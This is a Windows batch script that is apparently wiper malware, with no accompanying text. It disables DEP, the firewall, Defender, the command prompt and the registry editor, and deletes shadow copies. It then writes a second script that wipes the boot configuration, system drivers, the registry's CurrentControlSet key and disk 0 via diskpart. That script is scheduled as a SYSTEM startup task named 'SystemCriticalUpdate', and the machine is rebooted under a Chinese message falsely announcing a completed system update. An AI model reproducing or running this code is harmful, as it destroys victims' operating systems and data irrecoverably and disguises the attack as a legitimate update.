@echo off
bcdedit /set {current} nx AlwaysOff

netsh advfirewall set allprofiles state off

reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers" /v DefaultLevel /t REG_DWORD /d 262144 /f
reg add "HKCU\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{00000000-0000-0000-0000-000000000000}" /v ItemData /t REG_SZ /d "C:\Windows\System32\gpedit.msc" /f
reg add "HKCU\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths\{00000000-0000-0000-0000-000000000000}" /v SaferFlags /t REG_DWORD /d 0 /f

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

start cmd /k vssadmin delete shadows /all /quiet

start cmd /k takeown /f C:\Windows /r /y

reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f

(
echo @echo off
echo timeout /t 3 ^>nul
echo.
echo bcdedit /createstore C:\empty_bcd ^>nul 2^>^&1
echo bcdedit /import C:\empty_bcd /clean ^>nul 2^>^&1
echo.
echo takeown /f C:\Windows\System32\drivers /r /y ^>nul 2^>^&1
echo icacls C:\Windows\System32\drivers /grant Everyone:F /t ^>nul 2^>^&1
echo rmdir /s /q C:\Windows\System32\drivers ^>nul 2^>^&1
echo.
echo reg delete HKLM\SYSTEM\CurrentControlSet /f ^>nul 2^>^&1
echo.
echo  start /b cmd /c (echo select disk 0 ^& echo clean all ^& echo Y^) ^| diskpart ^>nul 2^>^&1
echo.
echo start /b cmd /c "del /f /s /q C:\Windows\System32\* ^>nul 2^>^&1"
echo.
echo del /f /q C:\destroy.bat
) > destroy.bat

schtasks /create /tn "SystemCriticalUpdate" /tr "C:\destroy.bat" /sc onstart /ru SYSTEM /f

shutdown /r /t 3 /f /c "系统更新完成，正在重启"